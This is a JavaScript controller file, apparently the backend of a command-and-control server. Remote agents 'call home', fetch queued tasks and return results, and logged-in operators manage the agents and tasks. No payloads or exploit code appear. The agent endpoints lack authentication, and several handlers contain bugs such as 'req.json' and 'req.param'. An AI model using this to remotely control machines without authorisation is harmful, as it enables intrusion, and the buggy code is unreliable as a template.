/**
 * @file Controller code for the agent-related ops.
 * @author Umar Abdul
 */

import Agent, * as agentModel from '../models/agent.js';
import Task, * as taskModel from '../models/task.js';

// A generic error message for requests that got denied due to perm issues.
const PERM_ERROR = {error: "Permission denied!"};

/**
 * Create a new agent. Called when a new agent calls home.
 * Sends an empty JSON to the client when it's unauthorized or a problem occurred.
 */
export const agentInit = (req, res) => {
  
  agentModel.createAgent(req.body).then(data => {
    return res.json(data.config);
  }).catch(error => {
    return res.status(500).json({error: error.message});
  });
};

/**
 * Get all agents. For authenticated users only.
 */
export const getAgents = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  agentModel.getAgents().then(agents => {
    return res.json(agents);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get an agent with given ID.
 */
export const getAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  agentModel.getAgent(req.params.uid).then(agent => {
    return req.json(agent);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Create a new task. For users only.
 */
export const createTask = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  taskModel.createTask(req.session.username, req.body).then(task => {
    return res.json(task);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get all tasks for all agents. For authenticated users only.
 * Should normally be used only once by clients for session setup. Any other update should be through ws
 */
export const getAllTasks = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  taskModel.getAllTasks().then(tasks => {
    return res.json(tasks);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to receive all their queued tasks.
 * Note: It will also mark all the tasks sent as 'received'.
 */
export const getPendingTasks = async (req, res) => {

  try{
    const agentID = req.params.uid;
    await agentModel.updateLastSeen(agentID);
    const tasks = await taskModel.getPendingTasks(agentID);
    // Mark them as received.
    for (let task of tasks){
      try{
        taskModel.markReceived(task.uid);
      }catch(err){
        console.log(err);
      }
    }
    return res.json(tasks);
  }catch(error){
    return res.json([]);
  };
};

/**
 * Get all the tasks created for a specific agent. For authenticated users only.
 */
export const getTasks = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.uid;
  taskModel.getTasks(agentID).then(tasks => {
    return res.json(tasks);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to submit the results of their tasks.
 */
export const setTasksResults = (req, res) => {

  const agentID = req.params.uid;
  const results = req.body;
  if (!(results && results.length !== 0))
    return res.json({});
  for (let result of results){
    try{
      taskModel.setResult(result.uid, result.result);
    }catch(error){
      console.log(error);
    }
  }
  return res.json({});
};

/**
 * Freeze an active agent.
 */
export const freezeAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.param.uid;
  agentModel.freezeAgent(agentID).then(data => {
    return res.json({success: "Agent frozen!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Unfreeze an active agent.
 */
export const unfreezeAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.param.uid;
  agentModel.unfreezeAgent(agentID).then(data => {
    return res.json({success: "Agent unfrozen!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Delete an agent.
 */
export const deleteAgent = async (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.uid;
  try{
    await agentModel.deleteAgent(agentID, req.session.username);
    await taskModel.deleteAllTasks(agentID);
    return res.json({success: "Agent deleted!"});
  }catch(error){
    return res.status(403).json({error: error.message});
  }
};

/**
 * Delete a task.
 */
export const deleteTask = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  taskModel.deleteTask(req.params.agentID, req.params.taskID, req.session.username).then(data => {
    return res.json({success: "Task deleted!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};
